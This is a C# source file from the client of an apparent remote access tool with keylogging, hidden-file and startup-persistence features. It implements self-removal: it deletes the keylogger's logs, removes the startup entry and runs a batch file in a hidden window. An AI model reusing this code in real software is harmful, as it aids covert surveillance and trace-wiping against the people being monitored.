using System;
using System.Diagnostics;
using System.IO;
using xClient.Config;
using xClient.Core.Data;
using xClient.Core.Helper;
using xClient.Core.Networking;
using xClient.Core.Utilities;

namespace xClient.Core.Installation
{
    public static class ClientUninstaller
    {
        public static void Uninstall(Client client)
        {
            try
            {
                RemoveExistingLogs();

                if (Settings.STARTUP)
                    Startup.RemoveFromStartup();

                if (!FileHelper.ClearReadOnly(ClientData.CurrentPath))
                    throw new Exception("Could not clear read-only attribute");

                string batchFile = FileHelper.CreateUninstallBatch(Settings.INSTALL && Settings.HIDEFILE);

                if (string.IsNullOrEmpty(batchFile))
                    throw new Exception("Could not create uninstall-batch file");

                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true,
                    FileName = batchFile
                };
                Process.Start(startInfo);

                Program.ConnectClient.Exit();
            }
            catch (Exception ex)
            {
                new Packets.ClientPackets.SetStatus(string.Format("Uninstallation failed: {0}", ex.Message)).Execute(client);
            }
        }

        public static void RemoveExistingLogs()
        {
            if (Directory.Exists(Keylogger.LogDirectory)) // try to delete Logs from Keylogger
            {
                try
                {
                    Directory.Delete(Keylogger.LogDirectory, true);
                }
                catch
                {
                }
            }
        }
    }
}
